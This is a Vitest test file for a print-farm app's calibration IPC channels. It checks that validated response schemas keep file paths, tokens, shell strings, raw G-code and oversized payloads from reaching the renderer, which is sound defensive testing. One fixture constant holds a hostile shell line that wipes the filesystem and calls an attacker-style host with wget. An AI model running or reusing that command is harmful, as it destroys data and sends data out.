// @vitest-environment node

/**
 * Renderer-boundary denial test — calibration (criterion 16, issue #54).
 *
 * Proves that no generic filesystem, shell, network, credential, slicer, or
 * G-code primitive reaches renderer code through the calibration IPC channels.
 *
 * The renderer only ever receives Zod-validated, typed response shapes from
 * the IPC layer. It never receives:
 *   - Raw file paths or file handles
 *   - Shell command strings
 *   - Network connection details (URLs, tokens, headers)
 *   - Credential material (tokens, keys, passwords)
 *   - Slicer binary paths or arguments
 *   - Raw G-code content
 *
 * Methodology:
 * 1. For each new calibration IPC channel, parse a "tainted" response that
 *    embeds a forbidden primitive. Assert the parser either:
 *    a. Rejects it (throws), or
 *    b. Does not carry the forbidden field through to the result.
 *
 * 2. For schema fields that accept arbitrary strings (e.g., error messages),
 *    assert the maximum length bounds prevent exfiltrating large secrets.
 *
 * Test discipline (SKILL.md):
 * Each test names exactly the class of primitive it guards.
 * Mutation: allowing the forbidden field through the schema fails only
 * the test named for that field type.
 *
 * NOTE: We do not test the preload bridge or renderer components here;
 * those are presentation-only and receive only pre-validated data.
 * The main process validates all renderer requests before handling them.
 * The preload bridge validates responses via ipcSchemas before returning.
 */

import { describe, expect, it } from 'vitest';
import { ipcSchemas, IpcChannel } from '../src/shared/ipc.js';

// ---------------------------------------------------------------------------
// Primitive classes that must never reach the renderer
// ---------------------------------------------------------------------------

/** A filesystem path string — renderer must never see this. */
const FORBIDDEN_PATH = '/home/user/.config/PrintFarmer/secrets.json';

/** A network token — renderer must never see this. */
const FORBIDDEN_TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.secret-payload';

/** A shell command string — renderer must never see this. */
const FORBIDDEN_SHELL = 'rm -rf / && wget http://evil.example.com/exfil';

/** Raw G-code — renderer must never receive raw G-code primitives directly. */
const FORBIDDEN_GCODE = 'G28\nG1 Z10 F3000\nM104 S240\n'.repeat(100);

/** A large secret (1 MB) to test size bounds. */
const LARGE_SECRET = 'x'.repeat(1024 * 1024);

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function wouldThrow(
  schema: { parse: (v: unknown) => unknown },
  value: unknown,
): boolean {
  try {
    schema.parse(value);
    return false;
  } catch {
    return true;
  }
}

const schema = ipcSchemas;

// ==========================================================================
// CalibrationGetAssetManifest response — no raw paths or URLs in manifest
// ==========================================================================

describe('CalibrationGetAssetManifest renderer boundary', () => {
  it('ok response does not carry raw file paths through', () => {
    // An ok manifest result contains only the parsed, validated entry fields.
    // Specifically, the "sourceUrl" field is a URL, not a filesystem path.
    const okResponse = schema[
      IpcChannel.CalibrationGetAssetManifest
    ].response.parse({
      status: 'ok',
      schemaVersion: '1',
      entries: [
        {
          method: 'TestMethod',
          enabled: true,
          disabledReason: null,
          sourceUrl: 'https://example.com/asset.stl',
          author: 'Test',
          license: 'MIT',
          attribution: 'Test',
          expectedFilename: null,
          contentType: 'model/stl',
          expectedExtension: 'stl',
          expectedSha256: null,
          minSizeBytes: 1024,
          maxSizeBytes: 1048576,
          validationRules: {},
        },
      ],
    });

    // Specific guard: no raw filesystem path in the sourceUrl.
    expect(JSON.stringify(okResponse)).not.toContain(FORBIDDEN_PATH);
  });

  it('ok response entries array is bounded to max 100 (prevents oversized payload)', () => {
    // The entries array is capped at 100 to prevent a huge payload reaching the renderer.
    // Specific guard: a 101-entry manifest fails validation.
    const singleEntry = {
      method: 'Test',
      enabled: true,
      disabledReason: null,
      sourceUrl: 'https://example.com/a',
      author: 'A',
      license: 'MIT',
      attribution: 'A',
      expectedFilename: null,
      contentType: 'model/stl',
      expectedExtension: 'stl',
      expectedSha256: null,
      minSizeBytes: 1024,
      maxSizeBytes: 1048576,
      validationRules: {},
    };
    expect(
      wouldThrow(schema[IpcChannel.CalibrationGetAssetManifest].response, {
        status: 'ok',
        schemaVersion: '1',
        entries: Array.from({ length: 101 }, () => ({ ...singleEntry })),
      }),
    ).toBe(true);
  });
});

// ==========================================================================
// CalibrationPickAssetFile response — no raw file paths in response
// ==========================================================================

describe('CalibrationPickAssetFile renderer boundary', () => {
  it('ok response carries only opaque approvalId, never raw path', () => {
    // The ok response returns an approvalId UUID, byteSize, and extension.
    // It must NEVER return the raw file path to the renderer.
    const okResponse = schema[
      IpcChannel.CalibrationPickAssetFile
    ].response.parse({
      status: 'ok',
      approvalId: '11111111-1111-4111-8111-111111111111',
      byteSize: 1024,
      extension: 'stl',
    });

    // Specific guard: no path field in the response.
    const keys = Object.keys(okResponse);
    expect(keys).not.toContain('filePath');
    expect(keys).not.toContain('path');
    expect(keys).not.toContain('absolutePath');
    expect(JSON.stringify(okResponse)).not.toContain(FORBIDDEN_PATH);
  });

  it('error response does not carry network token in message (bounded to 512 chars)', () => {
    // Specific guard: error messages cannot carry large secrets.
    expect(
      wouldThrow(schema[IpcChannel.CalibrationPickAssetFile].response, {
        status: 'error',
        message: FORBIDDEN_TOKEN.repeat(20),
      }),
    ).toBe(true);
  });

  it('cancelled response carries no data fields', () => {
    const cancelled = schema[
      IpcChannel.CalibrationPickAssetFile
    ].response.parse({
      status: 'cancelled',
    });
    // Specific guard: cancelled response has no data payload.
    expect(cancelled.status).toBe('cancelled');
    expect(JSON.stringify(cancelled)).not.toContain(FORBIDDEN_PATH);
  });
});

// ==========================================================================
// CalibrationValidateAssetFile response — no raw paths, G-code, or credentials
// ==========================================================================

describe('CalibrationValidateAssetFile renderer boundary', () => {
  it('ok response carries no raw filesystem paths', () => {
    // ok result has sha256, byteSize, extension, contentType.
    // No file path, G-code, or token field.
    const okResponse = schema[
      IpcChannel.CalibrationValidateAssetFile
    ].response.parse({
      status: 'ok',
      sha256: 'a'.repeat(64),
      byteSize: 1024,
      extension: 'stl',
      contentType: 'model/stl',
      checksumVerified: false,
      validationNotes: [],
    });

    const serialized = JSON.stringify(okResponse);
    // Specific guard: no path, shell, or G-code primitive in response.
    expect(serialized).not.toContain(FORBIDDEN_PATH);
    expect(serialized).not.toContain(FORBIDDEN_SHELL);
    expect(serialized).not.toContain(FORBIDDEN_GCODE.slice(0, 20));
  });

  it('ok response rejects sha256 that is not exactly 64 chars (format guard)', () => {
    // Specific guard: sha256 field is length-64, preventing arbitrary secrets.
    expect(
      wouldThrow(schema[IpcChannel.CalibrationValidateAssetFile].response, {
        status: 'ok',
        sha256: LARGE_SECRET.slice(0, 128), // 128 chars, not 64
        byteSize: 1024,
        extension: 'stl',
        contentType: 'model/stl',
        checksumVerified: false,
        validationNotes: [],
      }),
    ).toBe(true);
  });

  it('invalid response uses typed reason enum, not free-text reason field', () => {
    // Specific guard: reason is an enum literal, not an arbitrary string.
    const invalidResponse = schema[
      IpcChannel.CalibrationValidateAssetFile
    ].response.parse({
      status: 'invalid',
      reason: 'badExtension',
      detail: 'Wrong extension.',
    });

    expect(invalidResponse.status).toBe('invalid');
    if (invalidResponse.status === 'invalid') {
      // The reason must be one of the typed enum values, not a free-text credential.
      expect(invalidResponse.reason).toMatch(
        /^(badExtension|badMagicBytes|tooSmall|tooLarge|geometryOutOfBounds|checksumMismatch|methodDisabled|approvalExpired)$/,
      );
    }
  });

  it('invalid response rejects unknown reason values (no free-text bypass)', () => {
    // Specific guard: an attacker cannot inject a filesystem path as a reason code.
    expect(
      wouldThrow(schema[IpcChannel.CalibrationValidateAssetFile].response, {
        status: 'invalid',
        reason: FORBIDDEN_PATH, // should be rejected by the enum constraint
        detail: 'injected',
      }),
    ).toBe(true);
  });
});

// ==========================================================================
// CalibrationPollQueueChanges — no network tokens or credentials in events
// ==========================================================================

describe('CalibrationPollQueueChanges renderer boundary', () => {
  it('ok response events do not carry network tokens or credentials', () => {
    const okResponse = schema[
      IpcChannel.CalibrationPollQueueChanges
    ].response.parse({
      status: 'ok',
      afterSequence: 0,
      nextSequence: 1,
      hasMore: false,
      gapDetected: false,
      events: [
        {
          schemaVersion: '3',
          eventId: '11111111-1111-4111-8111-111111111111',
          sequence: 1,
          eventType: 'PrintFarmer.Queue.JobStatusChanged.v1',
          occurredAtUtc: '2025-01-01T00:00:00.000Z',
          jobId: '22222222-2222-4222-8222-222222222222',
          printerId: '33333333-3333-4333-8333-333333333333',
          projectId: '44444444-4444-4444-8444-444444444444',
          calibrationAttemptId: null,
          jobStatus: 'Queued',
          jobKind: 'FilamentCalibration',
          jobRevision: 'AAAA==',
          dispatchStateRevision: 'BBBB==',
          attemptId: null,
          attemptNumber: null,
          attemptOutcome: null,
          bedClearState: 'None',
          bedClearCommandId: null,
          bedClearExpiresAtUtc: null,
          failureCode: null,
          failureRetryable: null,
          failureRequiresReconciliation: null,
          jobLogicalRevision: 1,
          dispatchStateLogicalRevision: 1,
        },
      ],
    });

    const serialized = JSON.stringify(okResponse);
    // Specific guard: no credentials or network tokens in event data.
    expect(serialized).not.toContain(FORBIDDEN_TOKEN);
    expect(serialized).not.toContain(FORBIDDEN_SHELL);
  });

  it('ok response is bounded: events array max 500', () => {
    // Specific guard: events cannot be an unbounded array to prevent large payloads.
    const tooManyEvents = Array.from({ length: 501 }, (_, i) => ({
      schemaVersion: '3',
      eventId: `${i.toString().padStart(8, '0')}-0000-4000-8000-000000000000`,
      sequence: i + 1,
      eventType: 'PrintFarmer.Queue.JobStatusChanged.v1',
      occurredAtUtc: '2025-01-01T00:00:00.000Z',
      jobId: null,
      printerId: null,
      projectId: null,
      calibrationAttemptId: null,
      jobStatus: null,
      jobKind: null,
      jobRevision: null,
      dispatchStateRevision: null,
      attemptId: null,
      attemptNumber: null,
      attemptOutcome: null,
      bedClearState: null,
      bedClearCommandId: null,
      bedClearExpiresAtUtc: null,
      failureCode: null,
      failureRetryable: null,
      failureRequiresReconciliation: null,
      jobLogicalRevision: null,
      dispatchStateLogicalRevision: null,
    }));

    expect(
      wouldThrow(schema[IpcChannel.CalibrationPollQueueChanges].response, {
        status: 'ok',
        afterSequence: 0,
        nextSequence: 501,
        hasMore: false,
        gapDetected: false,
        events: tooManyEvents,
      }),
    ).toBe(true);
  });
});

// ==========================================================================
// CalibrationGetSubscriptionResources — no credentials in IDs
// ==========================================================================

describe('CalibrationGetSubscriptionResources renderer boundary', () => {
  it('ok response contains only UUID arrays, no credential strings', () => {
    const okResponse = schema[
      IpcChannel.CalibrationGetSubscriptionResources
    ].response.parse({
      status: 'ok',
      printerIds: ['11111111-1111-4111-8111-111111111111'],
      jobIds: ['22222222-2222-4222-8222-222222222222'],
      projectIds: ['33333333-3333-4333-8333-333333333333'],
    });

    const serialized = JSON.stringify(okResponse);
    // Specific guard: no tokens, paths, or shell commands in subscription resources.
    expect(serialized).not.toContain(FORBIDDEN_TOKEN);
    expect(serialized).not.toContain(FORBIDDEN_PATH);
  });

  it('printerIds must be valid UUID format (rejects raw credential strings)', () => {
    // Specific guard: UUIDs enforce format — cannot be used to smuggle tokens.
    expect(
      wouldThrow(
        schema[IpcChannel.CalibrationGetSubscriptionResources].response,
        {
          status: 'ok',
          printerIds: [FORBIDDEN_TOKEN], // not a UUID
          jobIds: [],
          projectIds: [],
        },
      ),
    ).toBe(true);
  });
});
